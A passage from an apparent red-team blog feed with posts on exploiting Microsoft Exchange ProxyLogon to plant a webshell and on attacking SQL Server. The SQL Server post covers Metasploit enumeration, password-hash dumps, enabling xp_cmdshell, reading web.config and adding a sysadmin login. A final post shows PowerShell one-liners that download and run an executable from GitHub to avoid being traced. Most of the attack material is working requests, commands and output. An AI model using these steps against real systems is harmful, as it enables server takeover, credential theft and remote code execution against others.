src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.38.png"></p><pre class="line-numbers language-none"><code class="language-none">you can get sid like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.45.59.png"></p><h3 id="Get-ASP-NET-SessionId-amp-msExchEcpCanary-these-two-sessions-are-very-important"><a href="#Get-ASP-NET-SessionId-amp-msExchEcpCanary-these-two-sessions-are-very-important" class="headerlink" title="Get ASP.NET_SessionId&amp;msExchEcpCanary (these two sessions are very important)"></a>Get ASP.NET_SessionId&amp;msExchEcpCanary (these two sessions are very important)</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.46.07.png"></p><pre class="line-numbers language-none"><code class="language-none">this use the proxyLogon interface，you will get these<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2717.15.24.png"></p><h3 id="File-writing"><a href="#File-writing" class="headerlink" title="File writing"></a>File writing</h3><h4 id="Get-oabid"><a href="#Get-oabid" class="headerlink" title="Get oabid"></a>Get oabid</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.46.30.png"></p><pre class="line-numbers language-none"><code class="language-none">Cookie: X-BEResource&#x3D;Administrator@YANGDC:444&#x2F;ecp&#x2F;DDI&#x2F;DDIService.svc&#x2F;GetObject?schema&#x3D;OABVirtualDirectory&amp;msExchEcpCanary&#x3D;OaGJzy--vU2R2T-d7WgnQKEIrHpkUtkIL2V05u5UZBIcJCZcsaybXdfRX6aM2wkavtBoAi8SbjY.&amp;a&#x3D;~1942062522; ASP.NET_SessionId&#x3D;e6d5b949-c1a2-4e98-bb5a-65b57526110f; msExchEcpCanary&#x3D;OaGJzy--vU2R2T-d7WgnQKEIrHpkUtkIL2V05u5UZBIcJCZcsaybXdfRX6aM2wkavtBoAi8SbjY.&#123;&quot;filter&quot;: &#123;&quot;Parameters&quot;: &#123;&quot;SelectedView&quot;: &quot;&quot;, &quot;SelectedVDirType&quot;: &quot;All&quot;, &quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;&#125;&#125;, &quot;sort&quot;: &#123;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.46.39.png"></p><h4 id="Change-the-dir-config"><a href="#Change-the-dir-config" class="headerlink" title="Change the dir config"></a>Change the dir config</h4><pre class="line-numbers language-none"><code class="language-none">The local environment cannot be modified successfully, so change the environment to demonstrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.47.00.png"></p><pre class="line-numbers language-none"><code class="language-none">Change the environment to modify the virtual directory configuration, ExternalUrl for our one-sentence Trojan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.47.30.png"></p><h4 id="Reset-the-dir"><a href="#Reset-the-dir" class="headerlink" title="Reset the dir"></a>Reset the dir</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.47.37.png"></p><pre class="line-numbers language-none"><code class="language-none">confirm our webshell name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.48.06.png"></p><h3 id="Success"><a href="#Success" class="headerlink" title="Success"></a>Success</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method%20(Manual%20use)/iShot2021-07-2716.48.29.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> RCE </tag>
            
            <tag> Exchange </tag>
            
            <tag> ProxyLogon </tag>
            
            <tag> CVE-2021-26855 </tag>
            
            <tag> CVE-2021-27065 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ProxyLogon Utilization method</title>
      <link href="2021/07/26/proxylogon-utilization-method/"/>
      <url>2021/07/26/proxylogon-utilization-method/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">The way of exploiting loopholes has come out long ago, mainly because there are more pits in the process of using one time, and the final failure, just have time to do things over and over again, and repeat learning hereIn the process, FQDN and OABID are the main pits encountered by the younger brother. If the older brothers have better articles, they can push the younger brother to read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Vulnerability Description:Exchange Server is an E-mail service component of Microsoft. It is a messaging and collaboration system. On March 3, 2021, Microsoft officially released a Security update for Microsoft Exchange, which disclosed several high-risk and critical vulnerabilities, including: In CVE-2021-26855 Exchange SSRF vulnerability, an attacker can directly construct malicious requests, initiate arbitrary HTTP requests as an Exchange server, scan the Intranet, and obtain Exchange user information. The vulnerability exploits no identity authenticationAffected version:Microsoft Exchange 2013Microsoft Exchange 2016Microsoft Exchange 2019Microsoft Exchange 2010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Local-environment"><a href="#Local-environment" class="headerlink" title="Local environment"></a>Local environment</h2><pre class="line-numbers language-none"><code class="language-none">Note that there are still some problems with the built environment. After the current test, only the SSRF succeeds, and the subsequent getshell environment needs to be changedI don&#39;t know if there is no getshell because of my brother&#39;s operation problem. If my brother can succeed, please tell my brotherI am using server2016+exchange2016，the following<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method/image-20210726161008442.png"></p><pre class="line-numbers language-none"><code class="language-none">New machine installation ex16 will report error, as follows, search the relevant dependence on self-installation, basic are very simple, also do not have to search what, what is missing under what<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method/image-20210726161114892.png"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><pre class="line-numbers language-none"><code class="language-none">The URL that tests can use:&#x2F;owa&#x2F;auth&#x2F;qqqqq.js&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;1.js&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;themes&#x2F;resources&#x2F;logon.css&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;themes&#x2F;resources&#x2F;.....set cookie：X -AnonResource&#x3D;true; X-AnonResource-Backend&#x3D;XXXXXX&#x2F;ecp&#x2F;default.flt?~3; X-BEResource&#x3D;localhost&#x2F;owa&#x2F;auth&#x2F;logon.aspx?~3;You can use hackbar like this:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method/iShot2021-07-2618.19.39.png"></p><pre class="line-numbers language-none"><code class="language-none">DNS The following command output is displayed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method/iShot2021-07-2618.20.00.png"></p><h3 id="Mail-the-enumeration"><a href="#Mail-the-enumeration" class="headerlink" title="Mail the enumeration"></a>Mail the enumeration</h3><pre class="line-numbers language-none"><code class="language-none">You can use this:https:&#x2F;&#x2F;github.com&#x2F;charlottelatest&#x2F;CVE-2021-26855<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method/iShot2021-07-2618.26.12.png"></p><h3 id="Getshell（Many-of-the-public-scripts-have-problems-and-the-successful-one-is-recommended-here）"><a href="#Getshell（Many-of-the-public-scripts-have-problems-and-the-successful-one-is-recommended-here）" class="headerlink" title="Getshell（Many of the public scripts have problems, and the successful one is recommended here）"></a>Getshell（Many of the public scripts have problems, and the successful one is recommended here）</h3><pre class="line-numbers language-none"><code class="language-none">After many tests, it is found that sometimes the target can not be exploited successfully despite the existence of loopholes!!In addition, the local 2016 environment is still unable to getshell!!The OABID needs to be modified<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method/iShot2021-07-2618.26.40.png"></p><pre class="line-numbers language-none"><code class="language-none">Visit WebShell below<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/ProxyLogon%20Utilization%20method/iShot2021-07-2618.21.17.png"></p><h4 id="Regular-Webshell-upload-path-easy-to-turn-over-directory"><a href="#Regular-Webshell-upload-path-easy-to-turn-over-directory" class="headerlink" title="Regular Webshell upload path (easy to turn over directory)"></a>Regular Webshell upload path (easy to turn over directory)</h4><pre class="line-numbers language-none"><code class="language-none">\inetpub\wwwroot\aspnet_client\ (any .aspx file under this folder or sub folders)\&lt;exchange install path&gt;\FrontEnd\HttpProxy\ecp\auth\ (any file besides TimeoutLogoff.aspx)\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\ (any file or modified file that is not part of a standard install)\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\Current\&lt;any aspx file in this folder or subfolders&gt;\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\&lt;folder with version number&gt;\&lt;any aspx file in this folder or subfolders&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="More-Principle-Reference"><a href="#More-Principle-Reference" class="headerlink" title="More Principle Reference"></a>More Principle Reference</h6><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.volexity.com&#x2F;blog&#x2F;2021&#x2F;03&#x2F;02&#x2F;active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities&#x2F;https:&#x2F;&#x2F;www.praetorian.com&#x2F;blog&#x2F;reproducing-proxylogon-exploit&#x2F;https:&#x2F;&#x2F;testbnull.medium.com&#x2F;ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> RCE </tag>
            
            <tag> Exchange </tag>
            
            <tag> ProxyLogon </tag>
            
            <tag> CVE-2021-26855 </tag>
            
            <tag> CVE-2021-27065 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlserver common attack methods</title>
      <link href="2021/07/24/sqlserver-common-attack-methods/"/>
      <url>2021/07/24/sqlserver-common-attack-methods/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Default port 1433, NMAP fingerprint is as follows:PORT     STATE SERVICE  VERSION1433&#x2F;tcp open  ms-sql-s Microsoft SQL Server 2012 11.00.2100.00; RTM| ms-sql-ntlm-info:|   Target_Name: ROOTKIT|   NetBIOS_Domain_Name: ROOTKIT|   NetBIOS_Computer_Name: SRV-WEB-KIT|   DNS_Domain_Name: rootkit.org|   DNS_Computer_Name: Srv-Web-Kit.rootkit.org|   DNS_Tree_Name: rootkit.org|_  Product_Version: 6.3.9600Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsHost script results:| ms-sql-info:|   192.168.3.73:1433:|     Version:|       name: Microsoft SQL Server 2012 RTM|       number: 11.00.2100.00|       Product: Microsoft SQL Server 2012|       Service pack level: RTM|       Post-SP patches applied: false|_    TCP port: 1433<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="The-system-tables"><a href="#The-system-tables" class="headerlink" title="The system tables"></a>The system tables</h3><pre class="line-numbers language-none"><code class="language-none">Master: Records all system-level informationModel: Template database, such as for database size, collation, recovery model, and other database options, will be used for any database that is later createdMSDB: Arrange alarm and operationTempdb: Space to hold temporary objects or intermediate result setsResouce: read-only, containing the attached system objects that are physically persistent in the resource database and appear in sys mode for each database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Grammar-supplement"><a href="#Grammar-supplement" class="headerlink" title="Grammar supplement"></a>Grammar supplement</h3><pre class="line-numbers language-none"><code class="language-none">View all databasesSELECT Name FROM Master.. SysDatabases ORDER BY NameSELECT name FROM master.dbo.sysdatabasesView the name of the tableSELECT * FROM #databaseName#.INFORMATION_SCHEMA.TABLES;View service linksEXEC sp_linkedserversSELECT * FROM sys.servers;To view the userselect sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled &#x3D; 1 then &#39;Disabled&#39; else &#39;Enabled&#39; end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id &#x3D; sl.principal_id where sp.type not in (&#39;G&#39;, &#39;R&#39;) order by sp.name;Create a userCREATE LOGIN yangsir WITH PASSWORD &#x3D; &#39;Yangsirnb123&#39;sp_addsrvrolemember &#39;yangsir&#39;, &#39;sysadmin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Information-collection"><a href="#Information-collection" class="headerlink" title="Information collection"></a>Information collection</h3><h4 id="use-admin-mssql-mssql-enum-domain-accounts-about-domain-account"><a href="#use-admin-mssql-mssql-enum-domain-accounts-about-domain-account" class="headerlink" title="use admin/mssql/mssql_enum_domain_accounts about domain account"></a>use admin/mssql/mssql_enum_domain_accounts about domain account</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_domain_accounts) &gt; run[*] Running module against 192.168.3.73[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...[+] 192.168.3.73:1433 - Connected.[*] 192.168.3.73:1433 - SQL Server Name: SRV-WEB-KIT[*] 192.168.3.73:1433 - Domain Name: ROOTKIT[+] 192.168.3.73:1433 - Found the domain sid: 010500000000000515000000e23e1be0b3ff69b2200c3dd5[*] 192.168.3.73:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...[*] 192.168.3.73:1433 -  - ROOTKIT\Administrator[*] 192.168.3.73:1433 -  - ROOTKIT\Guest[*] 192.168.3.73:1433 -  - ROOTKIT\krbtgt[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Admins[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Users[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Guests[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Computers[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Controllers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="use-admin-mssql-mssql-enum-sql-logins-about-login-user"><a href="#use-admin-mssql-mssql-enum-sql-logins-about-login-user" class="headerlink" title="use admin/mssql/mssql_enum_sql_logins about login user"></a>use admin/mssql/mssql_enum_sql_logins about login user</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_sql_logins) &gt; run[*] Running module against 192.168.3.73[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...[+] 192.168.3.73:1433 - Connected.[*] 192.168.3.73:1433 - Checking if sa has the sysadmin role...[+] 192.168.3.73:1433 - sa is a sysadmin.[*] 192.168.3.73:1433 - Setup to fuzz 300 SQL Server logins.[*] 192.168.3.73:1433 - Enumerating logins...[+] 192.168.3.73:1433 - 35 initial SQL Server logins were found.[*] 192.168.3.73:1433 - Verifying the SQL Server logins...[+] 192.168.3.73:1433 - 10 SQL Server logins were verified:[*] 192.168.3.73:1433 -  - ##MS_PolicyEventProcessingLogin##[*] 192.168.3.73:1433 -  - ##MS_PolicyTsqlExecutionLogin##[*] 192.168.3.73:1433 -  - NT AUTHORITY\SYSTEM[*] 192.168.3.73:1433 -  - NT SERVICE\MSSQLSERVER[*] 192.168.3.73:1433 -  - NT SERVICE\SQLSERVERAGENT[*] 192.168.3.73:1433 -  - NT SERVICE\SQLWriter[*] 192.168.3.73:1433 -  - NT SERVICE\Winmgmt[*] 192.168.3.73:1433 -  - ROOTKIT\dbadmin[*] 192.168.3.73:1433 -  - ROOTKIT\sqladmin[*] 192.168.3.73:1433 -  - sa[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data"><a href="#use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data" class="headerlink" title="use auxiliary/admin/mssql/mssql_findandsampledata some interest data"></a>use auxiliary/admin/mssql/mssql_findandsampledata some interest data</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_findandsampledata) &gt; run[*] 192.168.3.73:1433     - Attempting to connect to the SQL Server at 192.168.3.73:1433...[+] 192.168.3.73:1433     - Successfully connected to 192.168.3.73:1433[*] 192.168.3.73:1433     - Attempting to retrieve data ...[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , Sys_User                      , PassWord                      , nvarchar                      , cfcd208495d565ef66e7dff9f98764, 5[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WC_Forum_User                 , PasswordType                  , int                           , 1                             , 1[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WM_Users                      , Password                      , nvarchar                      , 123                           , 7[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="use-auxiliary-scanner-mssql-mssql-hashdump-get-password"><a href="#use-auxiliary-scanner-mssql-mssql-hashdump-get-password" class="headerlink" title="use auxiliary/scanner/mssql/mssql_hashdump  get password"></a>use auxiliary/scanner/mssql/mssql_hashdump  get password</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(scanner&#x2F;mssql&#x2F;mssql_hashdump) &gt; run[*] 192.168.3.73:1433     - Instance Name: nil[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; sa:020008da5345d7acb57f6e081ab60b39cdd31a939c06d3ad751fa9fcdad7d17d864013f33f6bf013dd74e2559a2b82deb5776167ce4db13632b9d43ca62b17d335320f1e2399[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyEventProcessingLogin##:0200ce4fb17bbcb091201639a75dfef7681df56c695e199076214dfee2308db01792cb4266d9e650aeb823d694359f9b32b4250954ae0c399a7f59b33ca68eaa9c43a173adf4[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyTsqlExecutionLogin##:0200400c2a7a6af4d09e573e8a6ef82c3d171d3d77103df288f079c35b012b94e8bb6b8c26b6902cd0a3f37419bdab1fb8f83c1d0536e4bd374785c6623907139b1102e9f681[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Elevated-privileges"><a href="#Elevated-privileges" class="headerlink" title="Elevated privileges"></a>Elevated privileges</h3><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_escalate_execute_as need IMPERSONATION use admin&#x2F;mssql&#x2F;mssql_escalate_dbowner need dbowner<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Command-execution"><a href="#Command-execution" class="headerlink" title="Command execution"></a>Command execution</h3><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_exec use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_payloaduse exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_exec) &gt; run[*] Running module against 192.168.3.73[*] 192.168.3.73:1433 - The server may have xp_cmdshell disabled, trying to enable it...[*] 192.168.3.73:1433 - SQL Query: EXEC master..xp_cmdshell &#39;whoami&#39; output ------ rootkit\dbadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h4><pre class="line-numbers language-none"><code class="language-none">crackmapexec mssql 192.168.3.73 -d rootkit.org -u sqladmin -p Admin12345 -x &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20common%20attack%20methods/image-20210724132256320.png"></p><h4 id="use-xpcmdshell"><a href="#use-xpcmdshell" class="headerlink" title="use xpcmdshell"></a>use xpcmdshell</h4><pre class="line-numbers language-none"><code class="language-none">open xpcmdshellsp_configure &#39;show advanced options&#39;, &#39;1&#39;RECONFIGUREsp_configure &#39;xp_cmdshell&#39;, &#39;1&#39;RECONFIGUREthen use theseEXEC master..xp_cmdshell &#39;whoami&#39;EXEC xp_cmdshell &quot;whoami&quot;;EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20common%20attack%20methods/image-20210724132756918.png"></p><pre class="line-numbers language-none"><code class="language-none">get direxecute master..xp_dirtree &#39;c:&#39;execute master..xp_dirtree &#39;c:&#39;,1 execute master..xp_dirtree &#39;c:&#39;,1,1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20common%20attack%20methods/image-20210724134413840.png"></p><pre class="line-numbers language-none"><code class="language-none">python execEXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;getpass&quot;).getuser())&#39;EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;os&quot;).system(&quot;whoami&quot;))&#39;EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(open(&quot;C:\\inetpub\\wwwroot\\web.config&quot;, &quot;r&quot;).read())&#39;EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;import sysprint(sys.version)&#39;GO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sqlserver-amp-smbrelay"><a href="#sqlserver-amp-smbrelay" class="headerlink" title="sqlserver&amp;smbrelay"></a>sqlserver&amp;smbrelay</h3><pre class="line-numbers language-none"><code class="language-none">No relevant environment is currently availableyou can read:https:&#x2F;&#x2F;www.netspi.com&#x2F;blog&#x2F;technical&#x2F;network-penetration-testing&#x2F;executing-smb-relay-attacks-via-sql-server-using-metasploit&#x2F;like this:msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; optionsModule options (auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_ntlm_stealer):   Name                 Current Setting  Required  Description   ----                 ---------------  --------  -----------   PASSWORD             admin            no        The password for the specified username   RHOSTS               192.168.3.73     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT                1433             yes       The target port (TCP)   SMBPROXY             0.0.0.0          yes       IP of SMB proxy or sniffer.   TDSENCRYPTION        false            yes       Use TLS&#x2F;SSL for TDS data &quot;Force Encryption&quot;   THREADS              1                yes       The number of concurrent threads (max one per host)   USERNAME             sa               no        The username to authenticate as   USE_WINDOWS_AUTHENT  true             yes       Use windows authentification (requires DOMAIN option set)msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targetip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="about-mssqlclient-py"><a href="#about-mssqlclient-py" class="headerlink" title="about mssqlclient.py"></a>about mssqlclient.py</h3><pre class="line-numbers language-none"><code class="language-none">python3 mssqlclient.py -db master -windows-auth rootkit.org&#x2F;sqladmin:Admin12345@192.168.3.73<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20common%20attack%20methods/image-20210724135209969.png"></p><h3 id="about-sqsh"><a href="#about-sqsh" class="headerlink" title="about sqsh"></a>about sqsh</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Sqlserver%20common%20attack%20methods/image-20210724140056645.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Command execution </tag>
            
            <tag> Information collection </tag>
            
            <tag> Sqlserver </tag>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Some ways to download files remotely from Github</title>
      <link href="2021/07/23/some-ways-to-download-files-remotely-from-github/"/>
      <url>2021/07/23/some-ways-to-download-files-remotely-from-github/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">The goal is to improve the traceability cost, avoid being detected by the traceability, and improve the concealmentExisting documents:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exeYou need to download to C:\test and execute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><pre class="line-numbers language-none"><code class="language-none">powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;C:\test\yang.exe&#39;);start-process &#39;C:\test\yang.exe&#39;powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;c:\\test\\yang.exe&#39;);start-process &#39;c:\\test\\yang.exe&#39;<span aria-hidden="true" 